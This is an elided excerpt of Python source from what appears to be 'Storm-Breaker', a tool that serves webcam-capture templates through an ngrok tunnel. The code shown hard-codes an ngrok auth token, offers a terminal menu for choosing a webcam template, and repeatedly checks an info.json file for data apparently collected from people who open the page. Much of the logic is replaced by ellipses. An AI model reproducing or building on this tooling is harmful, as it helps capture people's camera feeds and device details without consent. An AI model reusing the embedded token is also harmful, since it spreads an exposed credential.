...
def set_ngrok_auth_token():
    with open("config.json", "r") as read_file:
        ...
        token = data["ngrok"]
        token = "2VhHVXN8ZumrWIUQarSCqheKeBF_2twp2s6sCRksz7rAHJFk6" 
...
def webcam():
    try:
        ...
        input1 = input(
            Fore.RED + " ┌─[" + Fore.LIGHTGREEN_EX + "STORM-BREAKER" + Fore.BLUE + "~" + Fore.WHITE + "@HOME" + Fore.RED + "/" + Fore.BLUE + "Select-Template" + Fore.RED + """
 └──╼ """ + Fore.WHITE + "$ ")
    ...
    def info():
        ...
        if not str(os.stat('webcam/' + webcam_mode + '/info.json').st_size) == stat_file_ip:
            ...
            try:
                ...
                print(Fore.RED + " [!] " + Fore.GREEN + "Turn On The ngrok And Try Again!\n")
        info()
